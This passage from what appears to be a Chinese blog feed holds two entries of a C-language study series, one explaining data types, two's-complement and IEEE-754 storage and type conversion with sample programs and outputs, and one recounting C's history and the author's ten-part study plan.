<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The size of char is 1 bytes</span><br><span class="line">The size of short is 2 bytes</span><br><span class="line">The size of int is 4 bytes</span><br><span class="line">The size of long int is 4 bytes</span><br><span class="line">The size of float is 4 bytes</span><br><span class="line">The size of double is 8 bytes</span><br></pre></td></tr></table></figure><blockquote><p><font size="2">需要说明的是上述程序的运行环境为32位，所以long的字节数是4bytes，而在64位环境下则为8bytes</font></p></blockquote><h4 id="font-color-blue-1有符号和无符号font"><a class="markdownIt-Anchor" href="#font-color-blue-1有符号和无符号font"></a> <font color="blue"><code>1.有符号和无符号</code></font></h4><p>      对于有符号和无符号数据类型这块，我想首先用一个问题来引出这部分的重点内容——<code>计算机怎么知道数值是有符号的还是无符号的呢？</code>众所周知，数值在计算机内部的存储方式是以<code>0 1</code>方式进行存储的，比如数值<code>4</code>在16位环境下的存储形式为<code>0000 0000 0000 0100</code>，很简单就能知道这是一个正数4，那么如果存储的是<code>-4</code>呢？（<font color="green" size="2">大家思考一下负数在内存的存储方式</font>），要知道<code>-4</code>在内存是以它的补码形式进行存储的，首先来看<code>-4</code>从原码到补码的转变：<code>1</code> <code>000 0100</code> <font size="2">（原码）</font>⇥ <code>1</code> <code>111 1011</code><font size="2">（反码）</font>⇥ <code>1</code> <code>111 1100</code> <font size="2">（补码）</font>，那么<code>-4</code>在内存的存储形式为<code>0xfc</code>，下面我们可以看一下32位环境下的无符号和有符号定义下<code>-4</code>和<code>4</code>的存储形式，是否和我们推导的一致呢？如下图：</p><p><img src="/images/131-2.png" alt></p><p>      从上图可以看出对于有符号数值是以数值的补码形式进行存储的，但是对于无符号下的负数是什么原因呢？这是因为你前面加上符号之后，相当于把变量提升为有符号类型，所以和正常的有符号下的存储是一样的。</p><blockquote><p><font color="red"><strong>知识点一</strong></font>：无论是整数和负数，在计算机内部都是以它们的补码的形式进行存储的。</p></blockquote><p>     这里通过一个简单的程序引出下面的问题，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">2147483649</span>, usum;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>, sum;</span><br><span class="line">        usum = i + j;</span><br><span class="line">    sum = i + j;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %d (d)\n"</span>,usum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %u (u)\n"</span>,usum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %d (d)\n"</span>,sum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %u (u)\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在看下方结果之前，大家先思考一下应该是什么结果？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">usum = 214783649 + 1 = 2147483650 (u)</span><br><span class="line">sum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">sum = 214783649 + 1 = 2147483650 (u)</span><br></pre></td></tr></table></figure><blockquote><p>看到上面的输出结果，我猜大家可能会有这样的问题：</p><ul><li>i和j都是正数，两个数相加之后怎么成负数了？</li><li>为什么格式符不同，输出的结果也不通呢？</li><li>usum是<code>unsigned int</code>类型，怎么成为了负数呢？</li></ul><p>下面我们一步一步的来进行解析。</p></blockquote><p>      首先我们知道了数值在机器内存是以补码的形式进行存储的，那么对于两个数相加机器是怎么处理的呢？在汇编层次，一般通过<code>add eax,edx</code>进行的，其中将<code>eax</code>和<code>edx</code>中的二进制相加，然后把结果存储到寄存器<code>eax</code>中，所以说<code>214783649 + 1</code>对于机器来说只不过是将这两个的二进制形式相加而已，关于补码加减运算应该要注意的是：负数的求反码和补码过程符号位是不参与计算的，要取出来，只有在进行负数补码的加减法的时候<code>符号位</code>才参与计算<sup>[1]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   214783649     1000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">+          1   +0000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">-------------   -----------------------------------------</span><br><span class="line">   ?&lt;=  1000 0000 0000 0000 0000 0000 0000 0010</span><br></pre></td></tr></table></figure><blockquote><p>关键的要来了，机器会把<code>1000 0000 0000 0000 0000 0000 0000 0010</code>看做什么呢？</p><ul><li>如果是有符号的话，则它的原码为<code>1111 1111 1111 1111 1111 1111 1111 1100</code>，因为是有符号的，所以最高位为符号位，为1表示是负数，那么<code>1111111111111111111111111111110</code>(去掉符号位的二进制)的十进制为<code>2147483646</code>，再加上符号，那么就是<code>-2147483646</code></li><li>如果是无符号的话，则它的原码就是其本身，那么该二进制的十进制为<code>2147483650</code></li></ul><p>之所以出现上述结果，原因在于格式符<code>%d</code>和<code>%u</code>：</p><ul><li><code>%d</code>是输出<strong>带符号</strong>十进制定点格式，也就是说机器通过<code>%d</code>将本无意义的二进制看作有符号的数值，那么第一位是符号位；</li><li><code>%u</code>是输出<strong>无符号</strong>十进制定点格式，也就是说不管前面是如何定义的，在这里的输出机器就把二进制串解析成无符号的十进制；</li></ul></blockquote><p><code>小节总结：</code></p><blockquote><ul><li>数值在内存中都以补码的形式进行存储和计算；(为什么要以补码的形式呢，见参考文献[1])</li><li>数值是有符号还是无符号，看用户怎么使用</li></ul></blockquote><h4 id="font-color-blue2浮点数在内存的存储形式font"><a class="markdownIt-Anchor" href="#font-color-blue2浮点数在内存的存储形式font"></a> <font color="blue"><code>2.浮点数在内存的存储形式</code></font></h4><p>      首先要说明的是，这里我们不会对浮点数的具体知识点展开，比如精度问题。我们知道了整型数值在内存中是以其补码的形式进行存储的，那浮点数在内存中是以什么形式进行存储的呢？既然不太清楚，那我们就先用一个简单的例子来看一下浮点数的存储方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">4.5</span>;<span class="comment">// 二进制形式为0000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="keyword">float</span> b = <span class="number">-4.5</span>;<span class="comment">// 二进制形式为1000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a:%f\n[*] b:%f\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      我们将其程序编译为32位的ELF程序，用GDB看一下ａ和ｂ的存储形式，如下：</p><p><img src="/images/131-3.jpg" alt></p><p>      我们现在对比一下a和b的二进制形式和在计算机内存存放的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ab</span><br><span class="line">数值自身形式：00000000000000000000000000000100.110000000000000000000000000000100.1</span><br><span class="line">内存中的存储：0100000010010000000000000000000011000000100100000000000000000000</span><br></pre></td></tr></table></figure><blockquote><p>可以看出数值本身的二进制形式和存放在内存中的形式完全不同，这是因为浮点数与整数的存储方式完全不同，根据<a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener"><code>IEEE-754</code></a>标准，我们可以知道浮点数是以如下方式进行存储的：</p></blockquote><p><img src="/images/131-4.png" alt></p><blockquote><p>既然我们知道了相关的存储方式<sup>[2]</sup>，那么机器如何操作的呢？下面我们还是一上面的程序为例，看一下相关的汇编代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ……</span><br><span class="line">   0x565561b0 &lt;+23&gt;:    add    eax,0x2e50</span><br><span class="line">   0x565561b5 &lt;+28&gt;:    fld    DWORD PTR [eax-0x1fe4]</span><br><span class="line">=&gt; 0x565561bb &lt;+34&gt;:    fstp   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561be &lt;+37&gt;:    fld    DWORD PTR [eax-0x1fe0]</span><br><span class="line">   0x565561c4 &lt;+43&gt;:    fstp   DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561c7 &lt;+46&gt;:    fld    DWORD PTR [ebp-0xc]</span><br><span class="line">   0x565561ca &lt;+49&gt;:    fld    DWORD PTR [ebp-0x10]</span><br><span class="line">   0x565561cd &lt;+52&gt;:    sub    esp,0xc</span><br><span class="line">   ……</span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>fld</code>、<code>fstp</code>指令是没有接触过，那么这里就简单介绍一下：</p></blockquote><p><code>fld指令</code></p><blockquote><p><code>指令格式</code>：FLD　STReg/MemReal    （STReg是处理器堆栈寄存器ST(0)~ST(7)）</p><p><code>指令功能</code>：将<strong>浮点数据压入<a href="https://zh.wikipedia.org/zh-hans/%E8%BC%94%E5%8A%A9%E8%99%95%E7%90%86%E5%99%A8" target="_blank" rel="noopener">协处理器</a>的堆栈中</strong>。当进行内存单元内容压栈时，系统会自动决定传送数据的精度。比如：用DD或REAL4定义的内存单元数值是单精度数等，类似于指令push</p></blockquote><p><code>fst指令</code>：</p><blockquote><p><code>指令格式</code>：FST STReg/MemReal</p><p><code>指令功能</code>：将<strong>协处理器堆栈栈顶的数据传送到目标操作数</strong>中。在进行数据传送时，系统自动根据控制寄存器中舍入控制位的设置把栈顶浮点数舍入成相应精度的数据。</p></blockquote><p><code>fstp指令</code></p><blockquote><p><code>指令格式</code>：FSTP STReg/MemReal</p><p><code>指令功能</code>：与FST相类似，所不同的是：指令FST执行完后，<strong>不进行堆栈的弹出操作</strong>，即：<strong>堆栈不发生变化</strong>，而指令FSTP执行完后，则需要进行堆栈的弹出操作，堆栈将发生变化。</p></blockquote><h3 id="font-color-navy0x01-数据常量font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-数据常量font"></a> <font color="navy"><code>0x01 数据常量</code></font></h3><h4 id="font-color-blue1字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue1字符和字符字面值font"></a> <font color="blue"><code>1.字符和字符字面值</code></font></h4><p>      从一个程序开始我们的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">char</span> b = <span class="string">'b'</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0x63</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a = %d(d) = %c(c)\n"</span>,a,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] c = %d(d) = %c(c)\n"</span>,c,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] d = %d(d) = %c(c)\n"</span>,d,d);</span><br><span class="line">    b--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] b-1 = %d(d) = %c(c)\n"</span>,b,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] a = 97(d) = a(c)</span><br><span class="line">[*] b = 98(d) = b(c)</span><br><span class="line">[*] c = 99(d) = c(c)</span><br><span class="line">[*] d = 100(d) = d(c)</span><br><span class="line">[*] b-1 = 97(d) = a(c)</span><br></pre></td></tr></table></figure><p>      字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul><p><code>总结</code></p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><h3 id="font-color-navy0x02-数据类型转换font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-数据类型转换font"></a> <font color="navy"><code>0x02 数据类型转换</code></font></h3><h4 id="font-color-blue1类型提升font"><a class="markdownIt-Anchor" href="#font-color-blue1类型提升font"></a> <font color="blue"><code>1.类型提升</code></font></h4><p>      首先举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">short</span> a= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> c;</span><br><span class="line">b = a;</span><br><span class="line">c = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]          short a = %d(d) = %u(u)\n"</span>,a,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned short b = %d(d) = %u(u)\n"</span>,b,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] unsigned int c = %d(d) = %u(u)\n"</span>,c,b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*]          short a = -1(d) = 4294967295(u)</span><br><span class="line">[*] unsigned short b = 65535(d) = 65535(u)</span><br><span class="line">[*] unsigned int c = -1(d) = 4294967295(u)</span><br></pre></td></tr></table></figure><p>      分析<code>printf的输出</code>，如下图：</p><p><img src="/images/131-5.png" alt></p><p><code>总结</code></p><blockquote><ul><li>有符号数按照有符号数的扩展规则（<strong>高位补符号位</strong>）扩展，无符号数按照无符号数的扩展规则（<strong>高位补0</strong>）扩展</li><li><strong>整型提升都解释为int</strong></li></ul></blockquote><h4 id="font-color-blue2类型降格font"><a class="markdownIt-Anchor" href="#font-color-blue2类型降格font"></a> <font color="blue"><code>2.类型降格</code></font></h4><p>      关于类型降格的相关知识点我只简单总结一下，大家可以自己写示例代码进行验证</p><blockquote><ul><li>当实数（浮点数）转换为整数时，实数的小数部分被全被舍去，只保留整数部分</li><li>当double类型转换为float类型，将去掉多余的数字，但按照四舍五入进行处理，这种会降低精度</li></ul></blockquote><h4 id="font-color-blue3显示转换font"><a class="markdownIt-Anchor" href="#font-color-blue3显示转换font"></a> <font color="blue"><code>3.显示转换</code></font></h4><p>      显示转换的方法有：<code>强制类型转换</code></p><h4 id="font-color-blue4隐式转换font"><a class="markdownIt-Anchor" href="#font-color-blue4隐式转换font"></a> <font color="blue"><code>4.隐式转换</code></font></h4><p>      隐式转换的方法有：</p><p><code>赋值转换</code></p><blockquote><p>通过赋值语句使符号右边表达式的值的类型自动转换为其左边变量的类型，如我们在类型提升中程序里面有关赋值的语句，如</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">3</span>,b;</span><br><span class="line">    <span class="keyword">short</span> i = <span class="number">4</span>,j;</span><br><span class="line">    j = a;<span class="comment">// int =&gt; short 类型降格</span></span><br><span class="line">    b = i;<span class="comment">// short =&gt; int 类型提升</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>一元转换</code></p><blockquote><p>将短型数扩展成机器处理的长度</p></blockquote><p><code>二元转换</code></p><blockquote><p>按照优先级顺序将各二元运算符的操作数提升为同一类型，长类型的优先级大于短类型的优先级</p></blockquote><p><code>输出转换</code></p><blockquote><p>比如我们前面讲到的<code>printf()</code>的格式符<code>%d</code>，是将数据类型提升/降格为<code>signed int</code>类型</p></blockquote><h3 id="font-colornavy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-colornavy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/30395946" target="_blank" rel="noopener">计算机补码运算背后的数学原理是什么？</a></p><p>[2] <a href="https://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html" target="_blank" rel="noopener">浮点数的二进制表示</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基本数据类型font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基本数据类型font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="C" scheme="https://muzibing.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列一】 重新认识 C 语言</title>
    <link href="https://muzibing.github.io/2020/06/22/2020.06.22%EF%BC%88130%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/22/2020.06.22（130）/</id>
    <published>2020-06-21T16:00:00.000Z</published>
    <updated>2020-06-22T06:32:08.549Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy1c语言的历史font"><a class="markdownIt-Anchor" href="#font-color-navy1c语言的历史font"></a> <font color="navy"><code>1.C语言的历史</code></font></h3><p>      贝尔实验室的<code>Dennis Ritchie</code><font size="2">（1941－2011年）</font>为了给在<code>PDP-11</code>电脑上运行的Unix系统设计出一个系统级的编程语言，他在B语言的基础上创造了C语言，这是一门<code>高级编程语言</code>。</p><p><code>1969-1973年：早期的C语言</code></p><blockquote><ul><li><font size="2"><code>1969年</code>：<strong>基于 BCPL 创建 B</strong> ，以作为 Unix 的系统程序语言替代 PDP-7 汇编器</font></li><li><font size="2"><code>1971年</code>：于将 B 移植到<code>PDP-11</code> 时创建 NB （新“ B ”），也就是C语言的前身</font></li><li><font size="2"><code>1972年</code>：语言更名为 C</font></li><li><font size="2"><code>1973年</code>：Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上</font></li></ul></blockquote><p>      C语言源于<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL语言</a>，后者由<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>（Martin Richards）于1967年左右设计实现。BCPL是一门&quot;无类型&quot;的编程语言：它仅能操作一种数据类型，即<a href="https://zh.wikipedia.org/wiki/%E5%AD%97_(%E8%AE%A1%E7%AE%97%E6%9C%BA)" target="_blank" rel="noopener">机器字</a>（machine word）。1970年，肯·汤普逊为运行在<a href="https://zh.wikipedia.org/wiki/PDP-7" target="_blank" rel="noopener">PDP-7</a>上的首个Unix系统设计了一个精简版的BCPL，这个语言被称为<a href="https://zh.wikipedia.org/wiki/B%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">B语言</a>，它也是无类型的。</p><p><br>      Unix最早运行在PDP-7上，是以<a href="https://zh.wikipedia.org/wiki/%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">汇编语言</a>写成，在PDP-11出现后，丹尼斯·里奇与<a href="https://zh.wikipedia.org/wiki/%E8%82%AF%C2%B7%E6%B1%A4%E6%99%AE%E9%80%8A" target="_blank" rel="noopener">肯·汤普逊</a>着手将<a href="https://zh.wikipedia.org/wiki/Unix" target="_blank" rel="noopener">Unix</a>移植到PDP-11上，无类型的语言在<code>PDP-11</code>上愈发显得不合适。PDP-11提供了多种不同规格大小的基本对象：一字节长的字符，两字节长的整型数以及四字节长的浮点数。B语言无法处理这些不同规格大小的对象，也没有提供单独的操作符去操作它们。</p><p><br>      C语言最初尝试通过向B语言中增加数据类型的想法来处理那些不同类型的数据。和大多数语言一样，在C中，每个对象都有一个类型以及一个值；类型决定了可用于值的操作的含义，以及对象占用的存储空间大小。</p><p><br>      1973年，Unix<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1" target="_blank" rel="noopener">操作系统</a>的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上。</p><p><br><code>1974-至今：标准的C</code></p><blockquote><ul><li><font size="2"><code>1975年</code>：C语言开始移植到其他机器上使用</font></li><li><font size="2"><code>1978年</code>：<a href="https://zh.wikipedia.org/wiki/%E4%B8%B9%E5%B0%BC%E6%96%AF%C2%B7%E9%87%8C%E5%A5%87" target="_blank" rel="noopener">丹尼斯·里奇</a>和<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E8%90%8A%E6%81%A9%C2%B7%E6%9F%AF%E6%9E%97%E6%BC%A2" target="_blank" rel="noopener">布莱恩·柯林汉</a>合作出版了《<a href="https://zh.wikipedia.org/wiki/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80_(%E4%B9%A6)" target="_blank" rel="noopener">C程序设计语言</a>》( The C Programming Language )的第一版</font></li></ul></blockquote><hr><p>      下面给出一个C语言的发展时间轴：</p><p><img src="/images/130-1.jpg" alt></p><blockquote><ul><li><font size="2"><code>1954年-Fortran</code>：是世界上第一个被正式采用并流传至今的<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E9%9A%8E%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">高级编程语言</a>，由IBM开发完成</font></li><li><font size="2"><code>1958年-IAL(ALGOL)</code>：ALGOL被设计用来避免FORTRAN中一些已知的问题，最终引领了许多其它编程语言的兴起，包括<a href="https://zh.wikipedia.org/wiki/PL/I" target="_blank" rel="noopener">PL/I</a>、<a href="https://zh.wikipedia.org/wiki/Simula" target="_blank" rel="noopener">Simula</a>、<a href="https://zh.wikipedia.org/wiki/BCPL" target="_blank" rel="noopener">BCPL</a>、<a href="https://zh.wikipedia.org/wiki/B%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener">B</a>、<a href="https://zh.wikipedia.org/wiki/Pascal_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">Pascal</a>及<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">C</a></font></li><li><font size="2"><code>1958年-ALGOL58</code>：由IAL（国际代数语言，International Algebraic Language）改名而来。<a href="https://zh.wikipedia.org/wiki/ALGOL" target="_blank" rel="noopener">ALGOL</a>家族的第一个成员。它在1958年问世，<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>即是它的基础上开发而成</font></li><li><font size="2"><code>1960年-ALGOL60</code>：ALGOF60是一种面向问题的高级语言，它离硬件比较远，不宜用来编写系统程序。</font></li><li><font size="2"><code>1963年-CPL</code>：CPL是1963年剑桥大学发明的，CPL语言在<a href="https://zh.wikipedia.org/wiki/ALGOL_60" target="_blank" rel="noopener">ALGOL 60</a>的基础上更接近硬件一些，但规模比较大，难以实现</font></li><li><font size="2"><code>1967年-BCPL</code>：是一种计算机程序设计语言，源自更早的<a href="https://zh.wikipedia.org/wiki/CPL_(%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80)" target="_blank" rel="noopener">CPL</a>语言，1966年由剑桥大学的<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E4%B8%81%C2%B7%E7%90%86%E5%AF%9F%E5%BE%B7" target="_blank" rel="noopener">马丁·理察德</a>所发展出来的。Richards试着移除了CPL中最复杂的组成，第一支BCPL compiler在<a href="https://zh.wikipedia.org/w/index.php?title=IBM_7094&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">IBM 7094</a>电脑中完成</font></li><li><font size="2"><code>1969年-B</code>：贝尔实验室的Ken Thompson（肯·汤普森） 对BCPL又做了改进，设计出了简单的且接近硬件的B语言，并用B语言写了第一个UNIX OS。</font></li><li><font size="2"><code>1971年-C</code>：贝尔实验室的另外一个人Dennis MacAlistair Ritchie（D.M.Ritchie - DM里奇）在B的基础上设计出了C语言。C 保持了B的优点（精炼、接近硬件），又克服了他的缺点（过于简单，数据无类型），至此C语言渐渐发展成为目前世界上最常用的编程语言之一。</font></li></ul></blockquote><h3 id="font-color-navy2重新学习c语言的理由font"><a class="markdownIt-Anchor" href="#font-color-navy2重新学习c语言的理由font"></a> <font color="navy"><code>2.重新学习C语言的理由</code></font></h3><p>      接触C语言是在大一上学期，这也是我第一次接触编程，那个时候对C语言的学习可真谓云里雾里，对于C语言中一些知识点不能够很好的知道其原理，比如<code>一个程序的变量被存放在哪里了？指针到底是个什么东西？</code>等等一系列问题，导致在学习过程中可谓困难重重，对计算机慢慢产生了畏难情绪。在经过一段时间的学习，我认为在学习C语言之前更应该先去学习计算机中的一些理念和想法，比如<code>可执行文件的加载过程；程序是如何被运行的；在程序运行过程中，栈扮演了什么样的角色？</code>等等，所以在简单的了解了这些原理以后，我决定再来重新学习C语言，以便彻底的了解其整个运行机制和原理。</p><p>      我参考的书籍有：《C语言程序设计语言》(第2版)和《C语言程序设计教程》(第3版)</p><h3 id="font-color-navy3学习计划font"><a class="markdownIt-Anchor" href="#font-color-navy3学习计划font"></a> <font color="navy"><code>3.学习计划</code></font></h3><p>     现在计划10期将C语言学完，每一期的计划如下：</p><blockquote><p>第一期：数据类型</p><p>第二期：流程控制</p><p>第三期：函数和程序结构</p><p>第四期：数组</p><p>第五期：指针（上）</p><p>第六期：指针（下）</p><p>第七期：结构（体）</p><p>第八期：链表</p><p>第九期：文件</p><p>第十期：总结</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
